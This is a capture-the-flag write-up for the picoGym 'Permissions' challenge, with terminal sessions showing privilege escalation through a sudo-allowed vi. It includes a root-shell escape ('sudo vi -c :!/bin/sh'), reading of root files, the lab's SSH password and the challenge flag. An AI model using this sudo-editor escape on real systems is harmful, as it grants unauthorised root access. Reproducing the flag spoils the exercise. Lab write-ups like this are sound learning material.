# picoGym Level 0363: Permissions 🧠🧠🧠🧠🧠
Source: https://play.picoctf.org/practice/challenge/363

## Goal
Can you read files in the root file?<br>
The system admin has provisioned an account for you on the main server:<br>
ssh -p 50849 picoplayer@saturn.picoctf.net<br>
Password: 33qE7mB5BF<br>
Can you login and read the root file?

## What I learned
```
vi exploit
GTFO Bins: https://gtfobins.github.io/ (vi: sudo) ⭐⭐⭐⭐⭐
sudo -l               # see all sudo commands for current user
sudo vi               # can run commands inside using esc :ls -la /root
```

## Solution
```
https://webshell.picoctf.org/

AsianHacker-picoctf@webshell:~$ ssh -p 50849 picoplayer@saturn.picoctf.net ⌨️
The authenticity of host '[saturn.picoctf.net]:50849 ([13.59.203.175]:50849)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  ⌨️
Warning: Permanently added '[saturn.picoctf.net]:50849' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password:  ⌨️
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ whoami  ⌨️
picoplayer
picoplayer@challenge:~$ id  ⌨️
uid=1000(picoplayer) gid=1000(picoplayer) groups=1000(picoplayer)
picoplayer@challenge:~$ ls /root/  ⌨️
ls: cannot open directory '/root/': Permission denied

# Check what commands you can run w/ sudo
picoplayer@challenge:~$ sudo -l  ⌨️
[sudo] password for picoplayer:  ⌨️
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi 👀

picoplayer@challenge:~$ sudo vi /root  ⌨️
" ============================================================================
" Netrw Directory Listing                                        (netrw v165)
"   /root
"   Sorted by      name
"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\.obj$,\.info$,\.swp$,\.bak$,\~$
"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
" ==============================================================================
../                                                                                                                                                                                                                                       
./
.vim/
.bashrc
.flag.txt 👀 hidden file
.profile
picoplayer@challenge:~$ sudo vi /root/.flag.txt ⌨️❤️
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4} 🔐

# Method 2 GTFO Bins (Dangerous)
picoplayer@challenge:~$ sudo vi -c ':!/bin/sh' /dev/null ⌨️❤️❤️❤️❤️❤️
[sudo] password for picoplayer: ⌨️

# whoami ⌨️
root
# cd /root ⌨️
# ls ⌨️
# ls -la ⌨️
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Aug 20 02:43 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt 👀
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt ⌨️
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4} 🔐

# Method 3 Run commands in sudo vi w/ :! cat /root/.flag.txt
picoplayer@challenge:~$ sudo vi ⌨️❤️
[sudo] password for picoplayer: ⌨️

# in vi go to command :! cat /root/.flag.txt ❤️
Press ENTER or type command to continue
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4} 🔐
```

## Flag
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4} 

## Continue
[Continue](./picoGym0390.md)